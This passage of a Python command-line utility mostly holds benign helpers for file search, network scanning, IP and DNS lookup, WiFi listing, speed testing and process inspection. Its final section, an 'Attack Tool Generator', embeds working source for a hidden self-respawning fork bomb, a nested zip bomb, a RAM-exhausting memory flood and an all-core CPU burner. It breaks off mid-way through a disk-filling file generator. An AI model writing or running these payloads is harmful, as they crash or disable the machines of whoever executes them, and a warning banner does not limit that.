            
            print(f"\n{Fore.CYAN}Searching...")
            for root, _, files in os.walk(current_dir):
                for file in fnmatch.filter(files, pattern):
                    results.append(os.path.join(root, file))
                    
        elif choice == "2":
            min_size = float(input(f"{Fore.YELLOW}Enter minimum size in MB (0 for no limit): {Fore.WHITE}"))
            max_size = float(input(f"{Fore.YELLOW}Enter maximum size in MB (0 for no limit): {Fore.WHITE}"))
            
            print(f"\n{Fore.CYAN}Searching...")
            for root, _, files in os.walk(current_dir):
                for file in files:
                    filepath = os.path.join(root, file)
                    size_mb = os.path.getsize(filepath) / (1024 * 1024)
                    if (min_size == 0 or size_mb >= min_size) and (max_size == 0 or size_mb <= max_size):
                        results.append(filepath)
                        
        elif choice == "3":
            days = int(input(f"{Fore.YELLOW}Find files modified in the last X days: {Fore.WHITE}"))
            
            print(f"\n{Fore.CYAN}Searching...")
            now = time.time()
            for root, _, files in os.walk(current_dir):
                for file in files:
                    filepath = os.path.join(root, file)
                    if (now - os.path.getmtime(filepath)) <= (days * 86400):
                        results.append(filepath)
                        
        elif choice == "4":
            text = input(f"{Fore.YELLOW}Enter text to search for: {Fore.WHITE}")
            print(f"\n{Fore.CYAN}Searching text files (txt, log, ini, csv, md, py, json)...")
            
            for root, _, files in os.walk(current_dir):
                for file in files:
                    if file.endswith(('.txt', '.log', '.ini', '.csv', '.md', '.py', '.json')):
                        filepath = os.path.join(root, file)
                        try:
                            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                                if text.lower() in f.read().lower():
                                    results.append(filepath)
                        except:
                            continue
        
        if choice in ["1", "2", "3", "4"]:
            if results:
                print(f"\n{Fore.GREEN}Found {len(results)} matches:\n")
                for i, result in enumerate(results, 1):
                    size = humanize.naturalsize(os.path.getsize(result))
                    modified = datetime.fromtimestamp(os.path.getmtime(result)).strftime('%Y-%m-%d %H:%M:%S')
                    rel_path = os.path.relpath(result, current_dir)
                    
                    print(f"{Fore.YELLOW}{i:>3}. {Fore.WHITE}{rel_path}")
                    print(f"     {Fore.CYAN}Size: {Fore.WHITE}{size:<10} {Fore.CYAN}Modified: {Fore.WHITE}{modified}")
            else:
                print(f"\n{Fore.YELLOW}No matching files found.")
                
    except Exception as e:
        print(f"{Fore.RED}Error: {str(e)}")

def display_exit_screen():
    clear_screen()
    terminal_width = os.get_terminal_size().columns
    terminal_height = os.get_terminal_size().lines
    
    message = f"Thanks for using {PROGRAM_NAME}!"
    box_width = len(message) + 4
    padding_left = (terminal_width - box_width) // 2
    padding_top = (terminal_height - 5) // 2
    
    for _ in range(padding_top):
        print()
    
    print(" " * padding_left + f"{Fore.CYAN}╔{'═' * (box_width-2)}╗")
    print(" " * padding_left + f"{Fore.CYAN}║{Fore.GREEN + Style.BRIGHT} {message} {Fore.CYAN}║")
    print(" " * padding_left + f"{Fore.CYAN}╚{'═' * (box_width-2)}╝")
    
    time.sleep(1.5)

def network_scan():
    """Scan local network for active devices"""
    try:
        import socket
        import ipaddress
        
        # Get local IP address
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        
        # Get network address
        network = ipaddress.IPv4Network(f"{local_ip}/24", strict=False)
        
        print(f"{Fore.CYAN}Scanning local network ({network})...")
        print(f"{Fore.YELLOW}This may take a few minutes...")
        
        active_hosts = []
        with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
            futures = []
            for ip in network.hosts():
                futures.append(executor.submit(subprocess.call, ["ping", "-n", "1", "-w", "200", str(ip)], 
                                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
                
            for ip, future in zip(network.hosts(), futures):
                if future.result() == 0:
                    try:
                        hostname = socket.gethostbyaddr(str(ip))[0]
                    except:
                        hostname = "Unknown"
                    active_hosts.append((str(ip), hostname))
        
        print(f"\n{Fore.GREEN}Found {len(active_hosts)} active devices:")
        for ip, hostname in active_hosts:
            print(f"{Fore.WHITE}{ip:15} {Fore.YELLOW}{hostname}")
            
    except Exception as e:
        print(f"{Fore.RED}Error scanning network: {str(e)}")

def ip_lookup(ip=None):
    """Comprehensive IP address lookup tool"""
    try:
        if not ip:
            ip = input(f"{Fore.YELLOW}Enter IP address to lookup: {Fore.WHITE}")
            
        print(f"\n{Fore.CYAN}Gathering information about {ip}...")
        
        # Basic IP validation
        try:
            socket.inet_aton(ip)
        except socket.error:
            print(f"{Fore.RED}Invalid IP address format!")
            return
            
        # Get geolocation and network info
        response = requests.get(f"http://ip-api.com/json/{ip}").json()
        
        if response['status'] == 'success':
            print(f"\n{Fore.GREEN}Location Information:")
            print(f"{Fore.YELLOW}Country: {Fore.WHITE}{response.get('country', 'Unknown')}")
            print(f"{Fore.YELLOW}Region: {Fore.WHITE}{response.get('regionName', 'Unknown')}")
            print(f"{Fore.YELLOW}City: {Fore.WHITE}{response.get('city', 'Unknown')}")
            print(f"{Fore.YELLOW}ZIP: {Fore.WHITE}{response.get('zip', 'Unknown')}")
            print(f"{Fore.YELLOW}Timezone: {Fore.WHITE}{response.get('timezone', 'Unknown')}")
            print(f"{Fore.YELLOW}Coordinates: {Fore.WHITE}{response.get('lat', 'Unknown')}, {response.get('lon', 'Unknown')}")
            
            print(f"\n{Fore.GREEN}Network Information:")
            print(f"{Fore.YELLOW}ISP: {Fore.WHITE}{response.get('isp', 'Unknown')}")
            print(f"{Fore.YELLOW}Organization: {Fore.WHITE}{response.get('org', 'Unknown')}")
            print(f"{Fore.YELLOW}ASN: {Fore.WHITE}{response.get('as', 'Unknown')}")
            
            # Additional checks
            is_hosting = any(keyword in response.get('org', '').lower() for keyword in ['hosting', 'cloud', 'data center', 'server'])
            is_vpn = any(keyword in response.get('org', '').lower() for keyword in ['vpn', 'proxy'])
            
            # Get additional data from other APIs
            try:
                # Check if IP is in blacklists
                abuse_check = requests.get(f"https://api.abuseipdb.com/api/v2/check?ipAddress={ip}", 
                                        headers={'Key': 'YOUR_API_KEY'}).json()
                blacklist_status = abuse_check.get('data', {}).get('totalReports', 'Unknown')
            except:
                blacklist_status = "Could not check"
                
            print(f"\n{Fore.GREEN}Security Analysis:")
            print(f"{Fore.YELLOW}IP Type: {Fore.WHITE}{'Hosting/Cloud Provider' if is_hosting else 'Regular IP'}")
            print(f"{Fore.YELLOW}VPN/Proxy: {Fore.WHITE}{'Likely' if is_vpn else 'Unknown'}")
            print(f"{Fore.YELLOW}Blacklist Reports: {Fore.WHITE}{blacklist_status}")
            
            # Potential uses and risks
            print(f"\n{Fore.GREEN}Potential Uses & Security Implications:")
            if is_hosting:
                print(f"{Fore.YELLOW}• {Fore.WHITE}This IP belongs to a hosting provider or data center")
                print(f"{Fore.YELLOW}• {Fore.WHITE}Could be running web services, game servers, or cloud applications")
                print(f"{Fore.YELLOW}• {Fore.WHITE}May need to be whitelisted for certain services")
            elif is_vpn:
                print(f"{Fore.YELLOW}• {Fore.WHITE}This appears to be a VPN or proxy service")
                print(f"{Fore.YELLOW}• {Fore.WHITE}Could be used for anonymity or bypassing geo-restrictions")
                print(f"{Fore.YELLOW}• {Fore.WHITE}Consider blocking if unauthorized access is a concern")
            else:
                print(f"{Fore.YELLOW}• {Fore.WHITE}This appears to be a regular ISP-assigned IP")
                print(f"{Fore.YELLOW}• {Fore.WHITE}Typical use cases: home/office internet, personal devices")
                print(f"{Fore.YELLOW}• {Fore.WHITE}Standard security measures recommended")
            
            # Security recommendations
            print(f"\n{Fore.GREEN}Security Recommendations:")
            if blacklist_status != "Unknown" and blacklist_status > 0:
                print(f"{Fore.RED}• This IP has been reported for suspicious activity")
                print(f"{Fore.RED}• Consider blocking or monitoring traffic from this IP")
            if is_hosting:
                print(f"{Fore.YELLOW}• Verify the legitimacy of any services running on this IP")
                print(f"{Fore.YELLOW}• Implement proper firewall rules if hosting sensitive services")
            
        else:
            print(f"{Fore.RED}Could not retrieve information for this IP!")
            
    except Exception as e:
        print(f"{Fore.RED}Error during IP lookup: {str(e)}")

def wifi_info():
    """Display information about WiFi networks and Ethernet connections across different operating systems"""
    try:
        print(f"{Fore.CYAN}Checking network connections...")
        ethernet_found = False
        wifi_found = False
        
        # Determine OS and use appropriate commands
        if os.name == 'nt':  # Windows
            # Check for Ethernet connections first
            try:
                # Get network adapter information
                output = subprocess.check_output(["ipconfig", "/all"], encoding='utf-8')
                
                # Parse the output to find Ethernet adapters
                ethernet_adapters = []
                current_adapter = None
                
                for line in output.split('\n'):
                    line = line.strip()
                    
                    # New adapter section
                    if line.endswith(':') and not line.startswith(' '):
                        if current_adapter and 'Ethernet' in current_adapter['name']:
                            ethernet_adapters.append(current_adapter)
                        current_adapter = {'name': line[:-1], 'details': {}}
                    
                    # Adapter details
                    elif current_adapter and ':' in line:
                        key, value = line.split(':', 1)
                        current_adapter['details'][key.strip()] = value.strip()
                
                # Add the last adapter if it's Ethernet
                if current_adapter and 'Ethernet' in current_adapter['name']:
                    ethernet_adapters.append(current_adapter)
                
                # Display Ethernet information
                if ethernet_adapters:
                    ethernet_found = True
                    print(f"\n{Fore.GREEN}Found {len(ethernet_adapters)} Ethernet connections:")
                    
                    for adapter in ethernet_adapters:
                        print(f"\n{Fore.YELLOW}Adapter: {Fore.WHITE}{adapter['name']}")
                        
                        # Show important details
                        important_keys = [
                            'Physical Address', 
                            'IPv4 Address', 
                            'Subnet Mask',
                            'Default Gateway',
                            'DHCP Server',
                            'Connection-specific DNS Suffix',
                            'Link Speed'
                        ]
                        
                        for key in important_keys:
                            for detail_key, value in adapter['details'].items():
                                if key in detail_key:
                                    print(f"{Fore.YELLOW}{detail_key}: {Fore.WHITE}{value}")
                        
                        # Check if connected
                        if 'Media State' in adapter['details'] and 'disconnected' in adapter['details']['Media State']:
                            print(f"{Fore.RED}Status: Disconnected")
                        elif 'IPv4 Address' in adapter['details'].keys():
                            print(f"{Fore.GREEN}Status: Connected")
                        else:
                            print(f"{Fore.YELLOW}Status: Unknown")
            
            except subprocess.CalledProcessError:
                print(f"{Fore.RED}Error retrieving network adapter information.")
            
            # Now check for WiFi networks
            print(f"\n{Fore.CYAN}Scanning for WiFi networks...")
            try:
                # Add error handling and check if WiFi adapter is present
                subprocess.check_output(["netsh", "wlan", "show", "interfaces"], encoding='utf-8')
                output = subprocess.check_output(["netsh", "wlan", "show", "networks"], encoding='utf-8')
                
                networks = []
                current_network = {}
                
                for line in output.split('\n'):
                    line = line.strip()
                    if line.startswith('SSID'):
                        if current_network:
                            networks.append(current_network)
                        current_network = {'ssid': line.split(':')[1].strip()}
                    elif line.startswith('Network type'):
                        current_network['type'] = line.split(':')[1].strip()
                    elif line.startswith('Authentication'):
                        current_network['auth'] = line.split(':')[1].strip()
                    elif line.startswith('Signal'):
                        current_network['signal'] = line.split(':')[1].strip()
                        
                if current_network:
                    networks.append(current_network)
                
                if networks:
                    wifi_found = True
                    print(f"\n{Fore.GREEN}Found {len(networks)} WiFi networks:")
                    for net in networks:
                        print(f"\n{Fore.YELLOW}SSID: {Fore.WHITE}{net['ssid']}")
                        print(f"{Fore.YELLOW}Type: {Fore.WHITE}{net.get('type', 'Unknown')}")
                        print(f"{Fore.YELLOW}Security: {Fore.WHITE}{net.get('auth', 'Unknown')}")
                        print(f"{Fore.YELLOW}Signal: {Fore.WHITE}{net.get('signal', 'Unknown')}")
                    
                    # Show current WiFi connection
                    print(f"\n{Fore.CYAN}Current WiFi Connection:")
                    output = subprocess.check_output(["netsh", "wlan", "show", "interfaces"], encoding='utf-8')
                    print(f"{Fore.WHITE}{output}")
                
            except subprocess.CalledProcessError:
                if not ethernet_found:
                    print(f"{Fore.RED}No wireless interface found or WiFi is turned off.")
                else:
                    print(f"{Fore.YELLOW}No wireless interface found or WiFi is turned off.")
        
        elif sys.platform.startswith('linux'):  # Linux
            # Check for network interfaces using 'ip' command
            try:
                # Get all network interfaces
                output = subprocess.check_output(["ip", "addr", "show"], encoding='utf-8')
                
                # Parse the output to find network interfaces
                interfaces = []
                current_interface = None
                
                for line in output.split('\n'):
                    line = line.strip()
                    
                    # New interface section
                    if line.startswith(tuple(str(i) + ':' for i in range(10))):
                        if current_interface:
                            interfaces.append(current_interface)
                        
                        parts = line.split(':', 2)
                        if len(parts) >= 2:
                            iface_name = parts[1].strip()
                            current_interface = {
                                'name': iface_name,
                                'type': 'Ethernet' if not iface_name.startswith('wl') else 'WiFi',
                                'details': {}
                            }
                    
                    # Interface details
                    elif current_interface:
                        if 'inet ' in line:  # IPv4 address
                            current_interface['details']['IPv4 Address'] = line.split('inet ')[1].split('/')[0]
                        elif 'link/ether ' in line:  # MAC address
                            current_interface['details']['MAC Address'] = line.split('link/ether ')[1].split(' ')[0]
                
                # Add the last interface
                if current_interface:
                    interfaces.append(current_interface)
                
                # Display Ethernet information
                ethernet_interfaces = [iface for iface in interfaces if iface['type'] == 'Ethernet']
                if ethernet_interfaces:
                    ethernet_found = True
                    print(f"\n{Fore.GREEN}Found {len(ethernet_interfaces)} Ethernet connections:")
                    
                    for iface in ethernet_interfaces:
                        print(f"\n{Fore.YELLOW}Interface: {Fore.WHITE}{iface['name']}")
                        
                        for key, value in iface['details'].items():
                            print(f"{Fore.YELLOW}{key}: {Fore.WHITE}{value}")
                        
                        # Check if connected
                        if 'IPv4 Address' in iface['details']:
                            print(f"{Fore.GREEN}Status: Connected")
                        else:
                            print(f"{Fore.RED}Status: Disconnected")
                
                # Display WiFi information
                wifi_interfaces = [iface for iface in interfaces if iface['type'] == 'WiFi']
                if wifi_interfaces:
                    wifi_found = True
                    print(f"\n{Fore.GREEN}Found {len(wifi_interfaces)} WiFi connections:")
                    
                    for iface in wifi_interfaces:
                        print(f"\n{Fore.YELLOW}Interface: {Fore.WHITE}{iface['name']}")
                        
                        for key, value in iface['details'].items():
                            print(f"{Fore.YELLOW}{key}: {Fore.WHITE}{value}")
                        
                        # Check if connected
                        if 'IPv4 Address' in iface['details']:
                            print(f"{Fore.GREEN}Status: Connected")
                        else:
                            print(f"{Fore.RED}Status: Disconnected")
                
                # Try to get WiFi networks using 'iwlist' command
                try:
                    for iface in wifi_interfaces:
                        output = subprocess.check_output(["iwlist", iface['name'], "scan"], encoding='utf-8')
                        
                        networks = []
                        current_network = None
                        
                        for line in output.split('\n'):
                            line = line.strip()
                            
                            if 'ESSID:' in line:
                                if current_network:
                                    networks.append(current_network)
                                
                                essid = line.split('ESSID:"')[1].split('"')[0]
                                current_network = {'ssid': essid, 'details': {}}
                            
                            elif current_network:
                                if 'Quality=' in line:
                                    quality = line.split('Quality=')[1].split(' ')[0]
                                    current_network['details']['Signal'] = quality
                                elif 'Encryption key:' in line:
                                    encryption = line.split('Encryption key:')[1]
                                    current_network['details']['Encryption'] = encryption
                        
                        # Add the last network
                        if current_network:
                            networks.append(current_network)
                        
                        if networks:
                            print(f"\n{Fore.GREEN}Found {len(networks)} WiFi networks on {iface['name']}:")
                            
                            for net in networks:
                                print(f"\n{Fore.YELLOW}SSID: {Fore.WHITE}{net['ssid']}")
                                
                                for key, value in net['details'].items():
                                    print(f"{Fore.YELLOW}{key}: {Fore.WHITE}{value}")
                
                except subprocess.CalledProcessError:
                    print(f"{Fore.YELLOW}Could not scan for WiFi networks. Try running with sudo.")
            
            except subprocess.CalledProcessError:
                print(f"{Fore.RED}Error retrieving network information.")
        
        elif sys.platform == 'darwin':  # macOS
            # Check for network interfaces using 'ifconfig' command
            try:
                # Get all network interfaces
                output = subprocess.check_output(["ifconfig"], encoding='utf-8')
                
                # Parse the output to find network interfaces
                interfaces = []
                current_interface = None
                
                for line in output.split('\n'):
                    line = line.strip()
                    
                    # New interface section
                    if line and not line.startswith('\t') and not line.startswith(' '):
                        if current_interface:
                            interfaces.append(current_interface)
                        
                        iface_name = line.split(':')[0]
                        current_interface = {
                            'name': iface_name,
                            'type': 'Ethernet' if iface_name.startswith('en') else 'WiFi' if iface_name.startswith('wl') else 'Other',
                            'details': {}
                        }
                    
                    # Interface details
                    elif current_interface:
                        if 'inet ' in line:  # IPv4 address
                            current_interface['details']['IPv4 Address'] = line.split('inet ')[1].split(' ')[0]
                        elif 'ether ' in line:  # MAC address
                            current_interface['details']['MAC Address'] = line.split('ether ')[1]
                
                # Add the last interface
                if current_interface:
                    interfaces.append(current_interface)
                
                # Display Ethernet information
                ethernet_interfaces = [iface for iface in interfaces if iface['type'] == 'Ethernet']
                if ethernet_interfaces:
                    ethernet_found = True
                    print(f"\n{Fore.GREEN}Found {len(ethernet_interfaces)} Ethernet connections:")
                    
                    for iface in ethernet_interfaces:
                        print(f"\n{Fore.YELLOW}Interface: {Fore.WHITE}{iface['name']}")
                        
                        for key, value in iface['details'].items():
                            print(f"{Fore.YELLOW}{key}: {Fore.WHITE}{value}")
                        
                        # Check if connected
                        if 'IPv4 Address' in iface['details']:
                            print(f"{Fore.GREEN}Status: Connected")
                        else:
                            print(f"{Fore.RED}Status: Disconnected")
                
                # Display WiFi information
                wifi_interfaces = [iface for iface in interfaces if iface['type'] == 'WiFi']
                if wifi_interfaces:
                    wifi_found = True
                    print(f"\n{Fore.GREEN}Found {len(wifi_interfaces)} WiFi connections:")
                    
                    for iface in wifi_interfaces:
                        print(f"\n{Fore.YELLOW}Interface: {Fore.WHITE}{iface['name']}")
                        
                        for key, value in iface['details'].items():
                            print(f"{Fore.YELLOW}{key}: {Fore.WHITE}{value}")
                        
                        # Check if connected
                        if 'IPv4 Address' in iface['details']:
                            print(f"{Fore.GREEN}Status: Connected")
                        else:
                            print(f"{Fore.RED}Status: Disconnected")
                
                # Try to get WiFi networks using 'airport' command
                try:
                    airport_path = "/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport"
                    output = subprocess.check_output([airport_path, "-s"], encoding='utf-8')
                    
                    lines = output.split('\n')
                    if len(lines) > 1:  # Skip header line
                        networks = []
                        
                        for line in lines[1:]:
                            if not line.strip():
                                continue
                                
                            parts = line.split()
                            if len(parts) >= 5:
                                ssid = parts[0]
                                signal = parts[2]
                                security = parts[6] if len(parts) > 6 else "Unknown"
                                
                                networks.append({
                                    'ssid': ssid,
                                    'signal': signal,
                                    'security': security
                                })
                        
                        if networks:
                            print(f"\n{Fore.GREEN}Found {len(networks)} WiFi networks:")
                            
                            for net in networks:
                                print(f"\n{Fore.YELLOW}SSID: {Fore.WHITE}{net['ssid']}")
                                print(f"{Fore.YELLOW}Signal: {Fore.WHITE}{net['signal']}")
                                print(f"{Fore.YELLOW}Security: {Fore.WHITE}{net['security']}")
                
                except (subprocess.CalledProcessError, FileNotFoundError):
                    print(f"{Fore.YELLOW}Could not scan for WiFi networks.")
            
            except subprocess.CalledProcessError:
                print(f"{Fore.RED}Error retrieving network information.")
        
        else:
            print(f"{Fore.RED}Unsupported operating system: {sys.platform}")
        
        if not ethernet_found and not wifi_found:
            print(f"{Fore.RED}No network interfaces found.")
        
    except Exception as e:
        print(f"{Fore.RED}Error getting network information: {str(e)}")

def speed_test():
    """Perform an internet speed test"""
    try:
        print(f"{Fore.YELLOW}Testing internet speed...")
        print(f"{Fore.CYAN}This may take a minute...")
        
        def download_speed():
            urls = [
                "https://speed.cloudflare.com/__down?bytes=25000000",  # 25MB file
                "http://speedtest.ftp.otenet.gr/files/test100k.db",    # Backup URL
            ]
            
            for url in urls:
                try:
                    start_time = time.time()
                    response = requests.get(url, stream=True, timeout=10)
                    downloaded = 0
                    
                    for data in response.iter_content(chunk_size=8192):
                        if data:
                            downloaded += len(data)
                            
                    duration = time.time() - start_time
                    if duration > 0:
                        return (downloaded * 8) / (1024 * 1024 * duration)  # Mbps
                except:
                    continue
            return 0
            
        def upload_speed():
            try:
                # Generate 10MB of random data
                data = b'X' * (10 * 1024 * 1024)  
                start_time = time.time()
                
                response = requests.post(
                    'https://speed.cloudflare.com/__up',
                    data=data,
                    timeout=10
                )
                
                duration = time.time() - start_time
                return (len(data) * 8) / (1024 * 1024 * duration)  # Mbps
            except:
                return 0
                
        def test_ping():
            try:
                start_time = time.time()
                requests.get('https://www.cloudflare.com', timeout=5)
                return (time.time() - start_time) * 1000  # ms
            except:
                return 999
        
        print(f"{Fore.CYAN}Testing download speed...")
        down_speed = download_speed()
        
        print(f"{Fore.CYAN}Testing upload speed...")
        up_speed = upload_speed()
        
        print(f"{Fore.CYAN}Testing ping...")
        ping = test_ping()
        
        print(f"\n{Fore.GREEN}Speed Test Results:")
        print(f"{Fore.YELLOW}Download: {Fore.WHITE}{down_speed:.1f} Mbps")
        print(f"{Fore.YELLOW}Upload: {Fore.WHITE}{up_speed:.1f} Mbps")
        print(f"{Fore.YELLOW}Ping: {Fore.WHITE}{ping:.0f} ms")
        
    except Exception as e:
        print(f"{Fore.RED}Error testing speed: {str(e)}")
        print(f"{Fore.YELLOW}Tip: Check your internet connection")

def dns_lookup():
    """Perform DNS lookups and reverse lookups"""
    try:
        while True:
            print(f"\n{Fore.CYAN}DNS Lookup Tools")
            print(f"{Fore.YELLOW}1. DNS Lookup (hostname to IP)")
            print(f"{Fore.YELLOW}2. Reverse DNS Lookup (IP to hostname)")
            print(f"{Fore.YELLOW}3. Get DNS Records")
            print(f"{Fore.YELLOW}4. Exit")
            
            choice = input(f"\n{Fore.GREEN}Choose option (1-4): {Fore.WHITE}")
            
            if choice == "1":
                hostname = input(f"{Fore.YELLOW}Enter hostname: {Fore.WHITE}")
                try:
                    ip = socket.gethostbyname(hostname)
                    print(f"{Fore.GREEN}IP Address: {Fore.WHITE}{ip}")
                except:
                    print(f"{Fore.RED}Could not resolve hostname")
                    
            elif choice == "2":
                ip = input(f"{Fore.YELLOW}Enter IP address: {Fore.WHITE}")
                try:
                    hostname = socket.gethostbyaddr(ip)[0]
                    print(f"{Fore.GREEN}Hostname: {Fore.WHITE}{hostname}")
                except:
                    print(f"{Fore.RED}Could not perform reverse lookup")
                    
            elif choice == "3":
                domain = input(f"{Fore.YELLOW}Enter domain: {Fore.WHITE}")
                try:
                    import dns.resolver
                    record_types = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'SOA']
                    
                    for record_type in record_types:
                        try:
                            answers = dns.resolver.resolve(domain, record_type)
                            print(f"\n{Fore.GREEN}{record_type} Records:")
                            for rdata in answers:
                                print(f"{Fore.WHITE}{rdata}")
                        except:
                            continue
                except:
                    print(f"{Fore.RED}Error getting DNS records")
                    
            elif choice == "4":
                break
                
    except Exception as e:
        print(f"{Fore.RED}Error performing DNS lookup: {str(e)}")

def analyze_memory():
    """Detailed memory analysis of running processes"""
    try:
        print(f"{Fore.CYAN}Memory Analysis")
        processes = []
        for proc in psutil.process_iter(['pid', 'name', 'memory_info']):
            try:
                info = proc.info
                mem = info['memory_info']
                processes.append({
                    'pid': info['pid'],
                    'name': info['name'],
                    'rss': mem.rss,
                    'vms': mem.vms,
                    'shared': mem.shared if hasattr(mem, 'shared') else 0,
                    'text': mem.text if hasattr(mem, 'text') else 0,
                    'data': mem.data if hasattr(mem, 'data') else 0
                })
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue
                
        processes.sort(key=lambda x: x['rss'], reverse=True)
        print(f"\n{'Process':<30} {'PID':>7} {'RSS':>10} {'VMS':>10} {'Shared':>10}")
        print("-" * 70)
        for proc in processes[:20]:
            print(f"{proc['name'][:30]:<30} {proc['pid']:7d} "
                  f"{humanize.naturalsize(proc['rss']):>10} "
                  f"{humanize.naturalsize(proc['vms']):>10} "
                  f"{humanize.naturalsize(proc['shared']):>10}")
    except Exception as e:
        print(f"{Fore.RED}Error: {str(e)}")

def scan_handles():
    """Scan and analyze open handles"""
    try:
        print(f"{Fore.CYAN}Handle Scanner")
        for proc in psutil.process_iter(['pid', 'name', 'num_handles']):
            try:
                info = proc.info
                if info['num_handles'] > 100:  # Show processes with many handles
                    print(f"\n{Fore.YELLOW}Process: {info['name']} (PID: {info['pid']})")
                    print(f"Open Handles: {info['num_handles']}")
                    # Get handle details using winapi
                    handles = proc.memory_maps()
                    for h in handles[:5]:  # Show first 5 handles
                        print(f"  {h.path if hasattr(h, 'path') else 'Unknown'}")
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue
    except Exception as e:
        print(f"{Fore.RED}Error: {str(e)}")

def map_dlls():
    """Map loaded DLLs for processes"""
    try:
        print(f"{Fore.CYAN}DLL Mapper")
        for proc in psutil.process_iter(['pid', 'name']):
            try:
                print(f"\n{Fore.YELLOW}Process: {proc.name()} (PID: {proc.pid})")
                dlls = proc.memory_maps()
                dll_dict = {}
                for dll in dlls:
                    if dll.path.lower().endswith('.dll'):
                        base_name = os.path.basename(dll.path)
                        dll_dict[base_name] = dll.path
                for name, path in sorted(dll_dict.items())[:5]:
                    print(f"  {name}: {path}")
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue
    except Exception as e:
        print(f"{Fore.RED}Error: {str(e)}")

def analyze_threads():
    """Analyze process threads"""
    try:
        print(f"{Fore.CYAN}Thread Analyzer")
        for proc in psutil.process_iter(['pid', 'name', 'num_threads']):
            try:
                info = proc.info
                if info['num_threads'] > 20:  # Show processes with many threads
                    print(f"\n{Fore.YELLOW}Process: {info['name']} (PID: {info['pid']})")
                    print(f"Thread count: {info['num_threads']}")
                    threads = proc.threads()
                    print("Thread details:")
                    for thread in threads[:5]:  # Show first 5 threads
                        print(f"  TID: {thread.id}, CPU Time: {thread.user_time}s")
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue
    except Exception as e:
        print(f"{Fore.RED}Error: {str(e)}")

def trace_stacks():
    """Trace process stacks"""
    try:
        print(f"{Fore.CYAN}Stack Tracer")
        target_pid = int(input(f"{Fore.YELLOW}Enter PID to trace: {Fore.WHITE}"))
        proc = psutil.Process(target_pid)
        
        print(f"\n{Fore.GREEN}Process: {proc.name()} (PID: {proc.pid})")
        
        # Get stack trace using WinAPI
        for thread in proc.threads():
            try:
                # This is a simplification - real stack tracing requires more complex WinAPI calls
                print(f"\nThread ID: {thread.id}")
                print(f"User Time: {thread.user_time}s")
                print(f"System Time: {thread.system_time}s")
            except:
                continue
                
    except Exception as e:
        print(f"{Fore.RED}Error: {str(e)}")

def generate_attack_tool():
    """Generate standalone attack tools using a simplified, more reliable approach"""
    clear_screen()
    print(f"{Fore.RED}Attack Tool Generator")
    print(f"{Fore.RED}{'=' * 60}\n")
    print(f"{Fore.RED}WARNING: These tools can cause permanent damage!")
    print(f"{Fore.RED}Use only on systems you own and control!\n")
    
    # Dictionary of available attack tools with descriptions and simpler code
    attack_tools = {
        "1": {
            "name": "Fork Bomb",
            "desc": "Crashes system by recursive process spawning",
            "code": """
import os
import sys
import subprocess
import time

def fork():
    while True:
        # Create a new process that runs itself with a special flag
        startupinfo = None
        if os.name == 'nt':  # Windows
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            
        try:
            # Create hidden window process
            subprocess.Popen(
                [sys.executable, __file__, "fork"],
                startupinfo=startupinfo,
                creationflags=subprocess.CREATE_NEW_CONSOLE,
                shell=True
            )
            # Also create visible processes to overwhelm
            subprocess.Popen(
                [sys.executable, __file__, "fork"],
                creationflags=subprocess.CREATE_NEW_CONSOLE
            )
            time.sleep(0.1)  # Small delay to control spawn rate
        except:
            continue

if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "fork":
        fork()  # Run fork bomb if launched with fork argument
    else:
        fork()
"""
        },
        "2": {
            "name": "Zip Bomb",
            "desc": "Creates expanding archive that fills storage",
            "code": """
import zipfile
import os
import time

def make_bomb(iterations=10):
    # Create a 1MB data file
    with open('data_file.txt','wb') as f:
        f.write(b'0' * 1024 * 1024)  # 1MB of zeros
    
    # Create nested zip files
    current_name = 'data_file.txt'
    for i in range(iterations):
        zip_name = f'zip_bomb_{i}.zip'
        with zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED) as zip_file:
            # Add multiple copies of the same file with different names
            for j in range(10):  # Add 10 copies in each zip
                zip_file.write(current_name, f'file_{j}.txt')
        
        # Remove previous file if it's not the original data file
        if i > 0:
            os.remove(current_name)
        
        current_name = zip_name
        print(f"Created layer {i+1}/{iterations}")
    
    # Keep the final zip file
    print(f"Zip bomb created: {current_name}")
    print(f"WARNING: Extracting this file can fill your storage!")
    os.remove('data_file.txt')

make_bomb(5)  # 5 layers of nesting
"""
        },
        "3": {
            "name": "Memory Flood",
            "desc": "Consumes all available RAM",
            "code": """
import sys
import time
import psutil

# Get total system memory
total_memory = psutil.virtual_memory().total

# Create array to hold memory chunks
memory_chunks = []
chunk_size = 256 * 1024 * 1024  # 256MB chunks for faster allocation

print("Starting memory flood...")
print(f"Total system memory: {total_memory / (1024**3):.1f} GB")

try:
    allocated = 0
    while True:
        try:
            # Allocate memory in chunks and keep references
            memory_chunks.append(bytearray(chunk_size))
            allocated += chunk_size
            
            # Print progress
            print(f"Allocated: {allocated / (1024**3):.1f} GB", end='\\r')
            
            # Small delay to allow OS to register memory usage
            time.sleep(0.1)
            
        except MemoryError:
            print("\\nMemory allocation failed - system memory limit reached")
            print(f"Final allocation: {allocated / (1024**3):.1f} GB")
            
            # Hold the allocated memory
            while True:
                time.sleep(1)
                
except KeyboardInterrupt:
    print("\\nMemory flood stopped by user")
    sys.exit()
"""
        },
        "4": {
            "name": "CPU Burner",
            "desc": "Maxes out CPU usage on all cores",
            "code": """
import multiprocessing
import time
def cpu_burner():
    while True:
        x = 0
        for i in range(10000000):
            x += i * i
            x = x % 1234567

if __name__ == "__main__":
    processes = []
    for i in range(multiprocessing.cpu_count()):
        process = multiprocessing.Process(target=cpu_burner, name=f"Burner-{i}")
        process.daemon = False
        processes.append(process)
        process.start()
        print(f"Started CPU burner process {i}")
"""
        },
        "5": {
            "name": "File Generator",
            "desc": "Creates huge files until disk is full",
            "code": """
import os
import time
import random
import string

# Create files until disk is full
